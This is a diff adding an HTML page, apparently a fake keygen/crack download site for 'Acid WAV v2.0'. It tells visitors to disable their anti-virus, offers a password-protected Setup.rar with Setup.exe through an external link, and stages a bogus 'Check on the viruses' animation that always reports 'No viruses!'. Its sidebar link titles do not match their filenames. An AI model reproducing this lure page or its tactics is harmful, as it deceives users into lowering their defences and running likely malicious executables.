@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html>
+   <head>
+      <title>Download Acid WAV v2.0</title>
+      <link id="favicon" rel="icon" type="image/x-icon" href="/img/favicon.ico">
+      <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"  crossorigin="anonymous">
+      <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css" rel="stylesheet">
+	  <meta name="description" content="Download Acid WAV v2.0">
+	  <meta name="keywords" content="Acid WAV v2.0">
+      <style type="text/css">
+         html, body {
+         overflow: hidden;
+         margin: 0;
+         padding: 0;
+         background-color: #f5f8fa;
+         }
+         .header {
+         background-color: #3097D1;
+         }
+         .logo {
+         font-size: 30px;
+         margin: 10px;
+         text-transform: uppercase;
+         color: #fff;
+         font-weight: 800;
+         }
+         button.btn.btn-outline-primary {
+         color: #fff;
+         border: 0px solid #fff;
+         padding: 7px 0;
+         font-weight: 700;
+         margin: 15px 0px 15px 35px;
+         }
+         button.btn.btn-outline-primary:hover {
+         background: none;
+         color:#eee;
+         }
+         .search { 
+         display: inline-block !important;
+         }
+         .search input {
+         border: 0;
+         }
+         .search button.btn.btn-outline-primary {
+         background: #fff;
+         color: #3097D1;
+         padding: 7px 15px;
+         margin: 15px 0;
+         }
+         .search button.btn.btn-outline-primary:hover {
+         background: #eee;
+         }
+         .container {
+         padding-top: 30px;
+         padding-bottom: 150px;
+         }
+         .inf, .file {
+         background: #fff;
+         border: 1px solid #ccc;
+         margin-bottom: 30px;
+         padding: 15px;
+         }
+         .file {
+         margin-bottom: 0px;
+         }
+         .file-footer {
+         color: #000;
+         text-align: right;
+         }
+         .file-footer i {
+         margin: 0 5px;
+         }
+         .download {
+         font-size: 15px;
+         color: #fff;
+         background-color: #1e7e34;
+         border-color: #1c7430;
+         padding: 15px 30px;
+         text-transform: uppercase;
+         margin: 30px 0px;
+         display: block;
+         }
+         .download:hover {
+         color: #fff;
+         background-color: #218838;
+         text-decoration: none;
+         }
+         h3 {
+         margin-bottom: 15px;
+         color: #000;
+         }
+         h4 {
+         padding-top: 60px;
+         font-size: 20px;
+         text-align: center;
+         }
+         .meta {
+         background: #fff;
+         border: 1px solid #ccc;
+         padding: 15px;
+         color: #ccc;
+         }
+         p.s-1, p.s-2, p.s-3 {
+         display: inline-block;
+         margin: 0;
+         cursor: pointer;
+         }
+         p.s-1 {
+         font-size: 25px;
+         }
+         p.s-2 {
+         font-size: 20px;
+         }
+         p.s-3 {
+         font-size: 15px;
+         }
+         .desc-prof {
+         text-align: center;
+         font-size: 13px;
+         }
+         .line {
+         width: 100%;
+         background: #e8e8e8;
+         border: 1px solid #ccc;
+         border-top: 0;
+         padding: 5px 15px;
+         color: #fff;
+         text-transform: uppercase;
+         font-weight: 800;
+         text-align: center;
+         }
+         .footer {
+         }
+         @media (max-width: 991px) {
+         .search {
+         display: none !important;
+         }
+         }
+         @media (max-width: 767px) {
+         .container { 
+         padding-bottom: 0;
+         }
+         .foot-hide {
+         display: none;
+         }
+         }
+         @media (max-width: 593px) {
+         .menu {
+         display: none !important;
+         }
+         .logo {
+         font-size: 25px;
+         }
+         }
+         .container-ant {
+         display: flex;
+         align-items: center;
+         justify-content: center;
+         margin: 13px 0;
+         }
+         .progress-bar {
+         height: 15px;
+         width: 200px;
+         background: lightgray;
+         }
+         .loaded {
+         height: 100%;
+         width: 100%;
+         background: #56B870;
+         animation: 7s cubic-bezier(.99, 1, .17, 0) loading;
+         transform-origin: 0%;
+         display: inline-grid;
+         }
+         button#wizard {
+         border: 0px;
+         padding: 10px 20px;
+         font-size: 14px;
+         background: #3097d1;
+         color: #fff;
+         font-weight: 500;
+         cursor: pointer;
+         }
+         .result {
+         animation: 10s linear result;
+         margin: 8px 0;
+         }
+         @keyframes loading {
+         0% {
+         transform: scaleX(0);
+         }
+         100% {
+         transform: scaleX(100%);
+         }
+         }
+         @keyframes result {
+         0% {
+         opacity:0;
+         }
+         79% {
+         opacity:0;
+         }
+         80% {
+         opacity:1;
+         }
+         85% {
+         opacity:0;
+         }
+         90% {
+         opacity:1;
+         }
+         95% {
+         opacity:0;
+         }
+         100% {
+         opacity:1;
+         }
+         }
+         #antivirus, .result {
+         display: none;
+         }
+      </style>
+      <script
+         src="https://code.jquery.com/jquery-3.3.1.min.js"
+         
+         crossorigin="anonymous"></script>
+      <script type="text/javascript">
+         $(document).ready(function(){
+             $("#wizard").click(function(){
+                 $("#antivirus").toggle();
+                 $("#wizard").toggle();
+                 $(".result").toggle();
+             });
+         });
+         
+               
+      </script>
+   </head>
+   <body>
+      <div class="row header">
+         <div class="col-lg-1 col-md-1 col-1"></div>
+         <div class="col-lg-3 col-md-5 col-5 logo"><i class="fa fa-magic" aria-hidden="true"></i> &nbsp;keygen</div>
+         <div class="col-lg-1 col-md-1 col-1"></div>
+         <div class="col-lg-6 col-md-4 col-4 menu text-right">
+            <form class="form-inline d-xs-none d-md-block search">
+               <input class="form-control mr-1" type="text" placeholder="Search files">
+               <button class="btn btn-outline-primary" type="submit">Search</button>
+            </form>
+            <button type="button" class="btn btn-outline-primary">Register</button> <button type="button" class="btn btn-outline-primary">Login</button>
+         </div>
+         <div class="col-lg-1 col-md-1 col-1"></div>
+      </div>
+      <div class="container">
+         <div class="row">
+            <div class="col-lg-3">
+            </div>
+            <div class="col-lg-6">
+               <div class="inf">
+                  <h3>Information: Acid WAV v2.0 </h3>
+                  File name: <b>Acid WAV v2.0</b><br>
+				  Archive name: <b>Setup.rar</b><br>
+				  Archive Password: <b>74125</b><br>
+				  Setup file: <b>Setup.exe</b><br>
+                  Date: <b><span>2022-3-16</span></b><br>
+				  Downloads: <b><span>5493</span></b><br>
+				  Views: <b><span>939</span></b><br>
+				  Rating: <b><span>91</span></b><br>
+				  <br><br>
+				  <b>Instalation instruction:</b> <span>Disable your anti-virus program before you download and unpack a hack, to the anti-virus program did not delete hacks! File verified and completely safe!</span><br>
+				  
+               </div>
+               <div class="file">
+                  <h3>Download file: Acid WAV v2.0</h3>
+                  <a class="download text-center" style="color:#fff; font-weight: bold; cursor: pointer;" target="_blank" onclick="window.open('http://keygen.ml/5i0i6o', '_blank');">download file</a>
+                  <div class="file-footer">
+                     <div class="row">
+                        <div class="col-lg-6 col-md-6 col-6 text-left">
+                           <button id="wizard">Check on the viruses</button>
+                           <div class="container-ant" id="antivirus">
+                              <div class="progress-bar">
+                                 <div class="loaded">
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                        <div class="col-lg-6 col-md-6 col-6 result"><i class="fa fa-check" style="font-size: 16px;"></i>No viruses!
+                        </div>
+                     </div>
+                  </div>
+               </div>
+               <div class="line">keygen, patch, serial key</div>
+               <div class="col-lg-3">
+               </div>
+            </div>
+         </div>
+      </div>
+      <div class="row footer">
+         <div class="col-lg-1"></div>
+         <div class="col-lg-10">
+            <footer class="page-footer font-small blue pt-4">
+               <div class="container-fluid text-center text-md-left">
+                  <div class="row">
+                     <div class="col-md-6 mt-md-0 mt-3">
+                        <h5 class="text-uppercase">keygen</h5>
+                        <p>2022. Here you can upload and download your files.</p>
+                     </div>
+                     <hr class="clearfix w-100 d-md-none pb-3">
+                     <div class="col-md-3 mb-md-0 mb-3 foot-hide">
+						<h5 class="text-uppercase">Top Downloads</h5>
+                        <ul class="list-unstyled">
+                           <li>
+                              <a href="macromedia-studio-mx.html">Ashampoo Movie Shrink n' Burn 1.0</a>
+                           </li>
+                           <li>
+                              <a href="shadowdefender-allversions-tested-all-serials-work.html">Actual Window Rollup v3.0</a>
+                           </li>
+                           <li>
+                              <a href="leap-v460.html">GameHouse Luck Charm Deluxe Serial by BalCrNepal</a>
+                           </li>
+                           <li>
+                              <a href="gamehouse-tik-s-texas-hold-emexe.html">Ahead DVD Ripper Standard Edition v1.4.3UCT</a>
+                           </li>
+                        </ul>
+                     </div>
+                     <div class="col-md-3 mb-md-0 mb-3 foot-hide">
+						<h5 class="text-uppercase">Recent Files</h5>
+                        <ul class="list-unstyled">
+                           <li>
+                              <a href="chilkat-mail-bounce-activex-v234.html">Capture By George! v2.71 by TSRH</a>
+                           </li>
+                           <li>
+                              <a href="impatica-for-powerpoint-250b.html">Gamehouse Tik s Texas Hold EmEXE</a>
+                           </li>
+                           <li>
+                              <a href="activestate-komodo-ide-v51430485-for-linux-libcpp6-x64.html">AUTODESK.AUTOCAD.MEP.V2011</a>
+                           </li>
+                           <li>
+                              <a href="bookbuddi-191.html">Acoustica MP3 Audio Mixer v2.14 v2.43</a>
+                           </li>
+                        </ul>
+                     </div>
+                  </div>
+               </div>
+            </footer>
+         </div>
+         <div class="col-lg-1"></div>
+      </div>
+   </body>
+</html>
